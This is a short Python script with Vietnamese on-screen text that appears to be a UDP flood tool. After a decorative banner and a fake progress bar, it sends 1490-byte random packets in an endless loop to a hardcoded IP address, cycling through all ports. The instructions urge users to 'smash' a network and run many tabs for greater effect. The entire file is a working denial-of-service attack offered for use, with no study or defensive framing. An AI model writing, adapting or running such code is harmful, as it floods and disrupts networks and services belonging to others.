#
import os
import time
import socket
import random
from datetime import datetime



now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("cls" if os.name == "nt" else "clear")
#print("\033[93m")
#print(f'ip: 188.166.223.121')
#print(f'port: 18')
#print()
# màu 
d = "\033[1;31m"
l = "\033[1;32m"
v = "\033[1;33m"
t = "\033[1;37m"
tim = "\033[1;35m"
x = "\033[1;36m"
thanh = f'\033[1;35m {t}=> '
hongthanh = f'{d}[{t}</>{d}] {t}=>'
den = "\033[1;90m"
lamd = "\033[1;34m"
logo = f"{t}[{d}=.={t}]"

# banner
def banner2():
    os.system('cls' if os.name=='nt' else 'clear')
    print(f'''
  {l} _____  .____                          
  /     \ |    |    ____   ____    ____  
 /  \ /  \|    |   /  _ \ /    \  / ___\ 
/    Y    \    |__(  <_> )   |  \/ /_/  >
\____|__  /_______ \____/|___|  /\___  / 
        \/        \/          \//_____/''')
banner2()
try:
    ip = "188.166.223.121"
    port = 18
    print(f"{l}╔═════════════════════════════════╗")
    print(f"{l}║          CÁCH SỬ DỤNG           ║")
    print(f'{l}║═════════════════════════════════║')
    print(f"{l}║      ĐẬP WIFI BẠN ĐANG DÙNG     ║")
    print(f'{l}║        NÊN BẬT NHIỀU TAD        ║')
    print(f'{l}║    ĐỂ CÓ TRÃI NGHIỆM TỐT NHẤT   ║')
    print(f'{l}║      Không nên chạy giả lập     ║')
    print(f"{l}╚═════════════════════════════════╝")
    print('')
    print(f"{l}[                    ] 0%")
    time.sleep(5)
    print(f"{l}[=====               ] 25%")
    time.sleep(5)
    print(f"{l}[==========          ] 50%")
    time.sleep(4)
    print(f"{l}[===============     ] 75%")
    time.sleep(3)
    print(f"{l}[====================] 100%")
    time.sleep(3)
    
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        if port == 65534:
            port = 1
except ValueError:
    print("Hãy xem lại cổng")
except socket.gaierror:
    print("Xem lại IP")
except KeyboardInterrupt:
    print("\nDừng đập rồi à tội cục mạng.")
finally:
    sock.close()